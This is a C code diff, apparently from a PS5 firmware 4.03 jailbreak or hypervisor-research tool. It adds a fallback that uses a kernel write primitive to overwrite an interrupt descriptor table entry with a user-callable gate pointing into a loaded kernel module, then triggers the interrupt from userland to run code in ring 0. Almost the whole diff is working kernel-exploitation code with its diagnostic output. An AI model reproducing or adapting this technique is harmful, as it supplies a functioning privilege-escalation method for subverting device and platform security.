@@ -1316,6 +1316,150 @@ static void campaign_kmod_kldload(void) {
     uint64_t first_qword;
     memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
 
+    /* ── Step 4b: IDT-based manual invocation (if SYSINIT/MOD_LOAD didn't fire) ──
+     *
+     * On PS5 FW 4.03 the kernel linker loads modules into RWX pages
+     * (GMET is not enforced until FW 6.50) but does NOT process SYSINIT
+     * or MOD_LOAD for dynamically loaded modules.
+     *
+     * Fallback: hook an IDT entry via kernel_copyin, point it at the
+     * hv_idt_trampoline in the loaded module, and trigger "int N" from
+     * userland.  The CPU transitions to ring 0 through the IDT gate and
+     * executes our trampoline → hv_init → campaigns → IRETQ back.
+     *
+     * This mirrors the approach used by r0gdb / kstuff for kernel code
+     * execution on FW 4.03 (IDT hooking for int1 / int13).
+     */
+    if (first_qword == 0) {
+        printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — trying IDT invocation...\n");
+
+        /* 4b-1: Get module base address via kldstat */
+        struct kld_file_stat kstat;
+        memset(&kstat, 0, sizeof(kstat));
+        kstat.version = sizeof(struct kld_file_stat);
+        ret = syscall(SYS_kldstat, kid, &kstat);
+        if (ret < 0) {
+            printf("[-] kldstat failed: errno=%d (%s)\n", errno, strerror(errno));
+            goto idt_skip;
+        }
+        printf("[+] kldstat: base=0x%lx, size=0x%lx, name='%.64s'\n",
+               (unsigned long)kstat.address, (unsigned long)kstat.size, kstat.name);
+
+        if (kstat.address == 0 || kstat.size == 0) {
+            printf("[-] kldstat returned invalid module info.\n");
+            goto idt_skip;
+        }
+
+        /* 4b-2: Find hv_idt_trampoline offset from the embedded .ko symbol table */
+        uint64_t trampoline_offset = 0;
+        {
+            /* Re-use the ELF types already defined above */
+            Elf64_Ehdr_t *ko_ehdr = (Elf64_Ehdr_t *)KMOD_KO;
+            if (ko_ehdr->e_shoff && ko_ehdr->e_shnum > 0) {
+                Elf64_Shdr_t *ko_shdrs = (Elf64_Shdr_t *)((const uint8_t *)KMOD_KO + ko_ehdr->e_shoff);
+                for (uint16_t s = 0; s < ko_ehdr->e_shnum; s++) {
+                    if (ko_shdrs[s].sh_type == SHT_SYMTAB) {
+                        Elf64_Sym_t *syms = (Elf64_Sym_t *)((const uint8_t *)KMOD_KO + ko_shdrs[s].sh_offset);
+                        uint64_t nsyms = ko_shdrs[s].sh_size / sizeof(Elf64_Sym_t);
+                        const char *strtab = (const char *)((const uint8_t *)KMOD_KO + ko_shdrs[ko_shdrs[s].sh_link].sh_offset);
+                        for (uint64_t i = 0; i < nsyms; i++) {
+                            if (strcmp(strtab + syms[i].st_name, "hv_idt_trampoline") == 0) {
+                                trampoline_offset = syms[i].st_value;
+                                printf("[+] hv_idt_trampoline: .text+0x%lx\n",
+                                       (unsigned long)trampoline_offset);
+                                break;
+                            }
+                        }
+                        break;  /* only one .symtab */
+                    }
+                }
+            }
+        }
+        if (trampoline_offset == 0) {
+            printf("[-] Could not find hv_idt_trampoline in .ko symbol table.\n");
+            goto idt_skip;
+        }
+
+        /* .text is the first SHF_ALLOC section → starts at module base */
+        uint64_t trampoline_kva = kstat.address + trampoline_offset;
+        printf("[*] Trampoline kernel VA: 0x%lx\n", (unsigned long)trampoline_kva);
+
+        /* 4b-3: Read IDTR (SIDT is unprivileged on AMD64) */
+        struct {
+            uint16_t limit;
+            uint64_t base;
+        } __attribute__((packed)) idtr;
+        __asm__ volatile("sidt %0" : "=m"(idtr));
+        printf("[*] IDTR: base=0x%lx, limit=0x%x (%u entries)\n",
+               (unsigned long)idtr.base, idtr.limit, (idtr.limit + 1) / 16);
+
+        /* 4b-4: Choose an unused interrupt vector */
+        #define HV_IDT_VECTOR 210  /* 0xD2 — well above PIC/APIC range */
+
+        if (((unsigned)(HV_IDT_VECTOR) + 1) * 16 > (unsigned)(idtr.limit + 1)) {
+            printf("[-] IDT has only %u entries — vector %u out of range.\n",
+                   (idtr.limit + 1) / 16, HV_IDT_VECTOR);
+            goto idt_skip;
+        }
+
+        struct idt_gate {
+            uint16_t offset_lo;    /* bits 0-15 of handler VA */
+            uint16_t selector;     /* kernel CS */
+            uint8_t  ist;          /* IST index (0 = use TSS RSP0) */
+            uint8_t  type_attr;    /* P | DPL | 0 | type */
+            uint16_t offset_mid;   /* bits 16-31 */
+            uint32_t offset_hi;    /* bits 32-63 */
+            uint32_t reserved;
+        } __attribute__((packed));
+
+        uint64_t gate_addr = idtr.base + HV_IDT_VECTOR * sizeof(struct idt_gate);
+
+        /* Save original gate */
+        struct idt_gate orig_gate;
+        kernel_copyout(gate_addr, &orig_gate, sizeof(orig_gate));
+
+        /* Get kernel CS from a known-good gate (e.g. #PF = vector 14) */
+        struct idt_gate ref_gate;
+        kernel_copyout(idtr.base + 14 * sizeof(struct idt_gate), &ref_gate, sizeof(ref_gate));
+        uint16_t kernel_cs = ref_gate.selector;
+        printf("[*] Kernel CS: 0x%04x (from IDT[14] page-fault handler)\n", kernel_cs);
+
+        /* Build our gate: interrupt gate, DPL=3 (ring-3 can trigger via INT) */
+        struct idt_gate new_gate;
+        memset(&new_gate, 0, sizeof(new_gate));
+        new_gate.offset_lo  = (uint16_t)(trampoline_kva & 0xFFFF);
+        new_gate.offset_mid = (uint16_t)((trampoline_kva >> 16) & 0xFFFF);
+        new_gate.offset_hi  = (uint32_t)(trampoline_kva >> 32);
+        new_gate.selector   = kernel_cs;
+        new_gate.ist        = 0;     /* use current thread's kernel stack */
+        new_gate.type_attr  = 0xEE;  /* P=1, DPL=3, type=0xE (interrupt gate) */
+
+        printf("[*] Installing IDT[%u] → 0x%lx (interrupt gate, DPL=3)...\n",
+               HV_IDT_VECTOR, (unsigned long)trampoline_kva);
+        kernel_copyin(&new_gate, gate_addr, sizeof(new_gate));
+
+        /* Clear shared buffer before invocation */
+        memset(result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);
+
+        /* 4b-5: Fire! Ring 3 → IDT gate → ring 0 trampoline → hv_init → IRETQ */
+        printf("[*] Triggering INT %u → hv_idt_trampoline → hv_init...\n", HV_IDT_VECTOR);
+        __asm__ volatile("int $210" ::: "memory");
+        printf("[+] Returned from ring-0 interrupt handler!\n");
+
+        /* 4b-6: Restore original IDT entry immediately */
+        kernel_copyin(&orig_gate, gate_addr, sizeof(orig_gate));
+        printf("[*] Original IDT[%u] restored.\n", HV_IDT_VECTOR);
+
+        /* Re-read results */
+        memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
+        if (first_qword != 0)
+            printf("[+] Buffer is no longer zero — IDT invocation worked!\n");
+        else
+            printf("[-] Buffer still zero after IDT invocation.\n");
+
+idt_skip: ;
+    }
+
     if (results->magic != KMOD_MAGIC) {
         printf("[-] Result buffer magic mismatch: expected 0x%llx, got 0x%llx\n",
                (unsigned long long)KMOD_MAGIC, (unsigned long long)results->magic);
@@ -1325,8 +1469,11 @@ static void campaign_kmod_kldload(void) {
             printf("    g_output_kva is correct, but campaign or copy crashed.\n");
             printf("    Try disabling VMMCALL campaigns (set RUN_VMMCALL_ENUM=0).\n");
         } else if (first_qword == 0) {
-            printf("[!] Buffer is all zeros - hv_init() likely NEVER executed.\n");
-            printf("    Neither SYSINIT nor MOD_LOAD path triggered.\n");
+            printf("[!] Buffer still all zeros after all init paths.\n");
+            printf("    Possible causes:\n");
+            printf("    - kldstat returned wrong base (relocs not applied)\n");
+            printf("    - IDT hook didn't reach trampoline\n");
+            printf("    - HV trapped execution from module pages\n");
         } else {
             printf("[!] Unexpected first qword: 0x%llx\n",
                    (unsigned long long)first_qword);
